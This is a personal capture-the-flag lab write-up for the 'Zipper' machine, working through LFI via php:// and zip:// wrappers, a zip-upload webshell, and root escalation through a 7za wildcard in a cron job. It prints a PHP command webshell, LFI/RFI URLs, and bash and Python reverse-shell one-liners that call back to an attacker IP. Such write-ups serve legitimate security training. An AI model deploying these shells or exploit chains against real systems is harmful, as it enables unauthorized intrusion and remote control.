# Zipper Helped-Through

Name: Zipper
Date:  1/11/2023
Difficulty:  Hard
Goals:  
- TJNull list machine
Learnt:
- Need to rescan (`nmap`) machines - missed the `rsync` port
- php filter automatically append .php
- BE CONFIDENT - bypass the CTF-Gaslighting with
	- If something should actually work, why is not actually working?
		- What components of the problem can you identify and what could actually be there but I have not identified and that is why it is probably not working as intended
Beyond Root:

- [[Zipper-Notes.md]]
- [[Zipper-CMD-by-CMDs.md]]


Very annoyingly I did test for, but did not know that for php filters the .php is automatically appended! Originally I write that "Read idiot read", but actually this is a more subtle improvement to be making
```php
http://192.168.109.128/index.php?file=php://filter/convert.base64-encode/resource=index.php
```

From payloadsallthethings - AAAAAAAAAAAAAAAAAAAAAAAAAARGH
![](excusemeforplatt.png)
## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](TryHackMe/Wreath/Screenshots/ping.png)

I made the mistake of getting stuck in to the port 80 manual enumerating and testing, although this was fruitful from a methodological perspective I missed the 873 port my automation and then my recursive recon failed in this area. 

Grab all the forms, url, etc 
![](gospiderrecon.png)

Brute forcing pages
![](uploads.png)

![](403.png)

Before using the form to upload I tested for directory traversal and file reading without success.
![](nodt.png)

Either 
![](zipconverter.png)
I saved this request for fuzzing, analysis and experimentation:
![1080](req.png)

- Questions and Theories - prior to note reading, research and testing.
- How could it work?
	- receive file -> check file -> zip File (without a password or key to encrypt at rest) | zip and then encrypt file  
- How could it be vulnerable and how to attack it: 
	- cmdi on zip software 
	- cmdi on potential encryption-at-rest software post zip
	- bypassing zip conversion to upload a webshell
		- force it to encrypt the zip converter php file to then bypass
		- evasion by filter bypasses, type, field manipulation, content manipulation,

- Interesting
	- accept: wildcard application types `*/*` 
- Look up
	- accept: q=0.8,v=b3;q=0.7
	- accept: application/signed-exchange
	- content-disposition: `name="img[]"`

What did not change when I uploaded test.txt
![](changesintest.png)

Intercept the download link
![1080](clicktodownload.png)

Intercepted response from the response to the request above
![](interceptthedownloadrequestresp.png)

- What I missed prior to testing:
	- Download functionality
		-  Possibly using [readfile](https://www.php.net/manual/en/function.readfile.php)

No LFI or DT for /uploads/
![](nolfiordtforuploads.png)

Uploaded index.php to be a stealthy
![](uploadingself.png)

It was successful
![](wassuccessful.png)

Resulting compression is from 3342 to 1412 bytes - potential signature based on compress rate?
![](resultingcompression.png)
- Takeways:
	- It accepts any file type
	- We have to control the execution of the zipping upon upload to:
		- Exfiltrate local files - we cant
		- Inject into the fields 
		- Inject into the names that will break 

I took the first hint:
> Discovering an upload for zips, the ability to retrieve zip files, and identifying an LFI can be chained together to achieve RCE

I need to discover the LFI. Almost certainly given the way the application retrieve files must be vulnerable some how.

I tried using payloadsallthethings payload wordlist to fuzz for LFI in a automated manner while I tried finding the source code where the LFI occurs.
![](ffuffuzzalfiondownloadsfromuploadsdir.png)

I compared the wordlist to my notes on encodings and found it practically the same. The next place would the be `index.php?file=`

With sadly similar results:
![](similarissuesonindexFILE.png)

Having put atleast 4 hours in an working through the hints for the second hint:
> We can leverage the LFI to unzip a zip archive using the zip:// wrapper

This is a php wrapper I was unaware of, dorking for this wrapper I found [rioasmara](https://www.google.com/search?client=firefox-b-e&q=php+zip+wrappter) and probably that is because I have not tried to use it.
![](zlibnotzip.png)

The problem is cannot seem to get a file reflected back, which seems to me to be the proof of concept that it would be vulnerable.
```
http://192.168.248.229/index.php?file=/etc/passwd
http://192.168.248.229/index.php?file=upload_1698494389.zip
http://192.168.248.229/index.php?file=php://filter/resource/etc/passwd
http://192.168.248.229/index.php?file=php://filter/resource/uploads/upload_1698494389.zip
http://192.168.248.229/index.php?file=php://filter/convert.base64-encode/resource=index.php
```


I could not RFI either 
```
http://192.168.248.229/index.php?file=http://$ip/test.txt
```

I tried similiar to upload a cmd.php and try to use the `zip://``
```
http://192.168.248.229/index.php?file=zip:/var/www/html/uploads/upload_1698496988.zip%23cmd.php&cmd=whoami
```

![](doublecheckingthesearch.png)

![](triplecheckingthesearch.png)

Background may not be 
![](doesnotlooklikeit.png)

Fuzz for PHP source files in the uploads directory just in case


Last time would be to FUZZ LFI on the filename parameter of the upload request
![](theburpintruder.png)

The problem is we  need to then get the link out of each response to then download and check unzip the file and views its contents, which all means script fool script. Given that I think I may have a way of doing this I will not click to Write up button for at least another hour additionally just to push myself with Python3 and not bash. If I do not do it in a hour then it is just admit defeat. I returned again and very glad to admit failure of this machine as I would have went down another rabbit hole. I opened the write up for this machine. My only mistake was I did not know php filter automatically append `.php` to the `resource=$FILE`. So I was trying to get `index.php.php`...

## Exploit

The more php you know...
![](themorephpyouknow.png)

`curl`ing and `base64` decoding the source code:
![](curlingouthismachine.png)

At this point it seems trivial. As I know and knew of different `php://filters` and that we could unzip and execute.

Uploading exploit.php:
```php
<?php echo system($_GET['cmd']); ?>
```

The link address
```php
http://192.168.181.229/uploads/upload_1698831334.zip
```

And RCE
![](andunzipyourwebshell.png)

So then we can just upload a shell, I have been burnt hard by not using `sh` so just to test I wanted to use `sh`
![](shshell.png)
The link for reference:
```
http://192.168.181.229/uploads/upload_1698831476.zip
```

## Foothold

And a shell
![1080](andshell.png)

From this point I closed the Write up knowing there is a cron job for the PrivEsc, but I wanted to not just follow along.

1. 2 is 1 and 1 is none
![](wecanrunininuxmem.png)
...make shell
![](makeshell2.png)
background shell with `nohup ./shell2.sh &`. Bad reverse shell...
```bash
echo "#\!/bin/bash\n/bin/bash -i >& /dev/tcp/192.168.45.235/8443 0>&1"
```
`zsh` and `bash` difference
![](zshandbashdifferences.png)

Weird sadness of reverse shells 
![](weirdness.png)

And no python shell - 
```
export RHOST="192.168.45.235";export RPORT=8443;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```
Now given my objectives I have just wasted 20 minutes with this...
![](nopyshell.png)

Sometimes the slower put a sliver beacon on the system is just the best way to go about everything and not worry about nice network economy when you are learning. 

## Privilege Escalation


I checked `ls -la /etc/cron.d` and `cat /etc/cron.d/php`, but my shell seems to have lost the `cat /etc/crontab`. I scrolled down and had to stop myself after reading `/etc/crontab`..

![](weirdingout.png)

Questioning whether this is the CTF equivalent of gas lighting I spammed a load of nonsense, which I do not recommend when dealing with actual people that gas light. 
![](thenIspammedandIremovedthecrontab.png)

And it is erasing output. The solution is just screenshot everything
![](solutionscreenshot.png)
The script:
1. create password variable to store the contents of `/root/secret`
2. change directory to `/var/www/html/uploads`
3. remove all files that end with `.tmp` extension
4. then use 7za - 7-zip
![](7zipaddfiles.png)
Breaking down the flags
```bash
a # add to archive
-p # use a password
# -t is actually the flag 
-tzip # of type zip 
```

![](backuplogexfil.png)

![](backuplog1.png)

We can abuse the wildcard and that root is running 7za potentially by making a command the name of the file and escaping the rest of the 7za. Reading the write up to make sure I actually trying to predict what I should be doing and then check the answer learning technique. Instead we can read a file. 

![](semicolondotzip.png)

![](7zhacktricks.png)

We want to read /root/secret as OS exams want proof of shell. A remind I need to clean up and always clean up
![](enox.png)

I was confused as to why I could not read the file, then backup.log...from the writeup - `>` the output is redirected!!!
![](amIconfusion.png)

And the password was already in the file.
![](sshforroot.png)
## Beyond Root

ReRead and whys around php filters. 
![](theacheofballs.png)
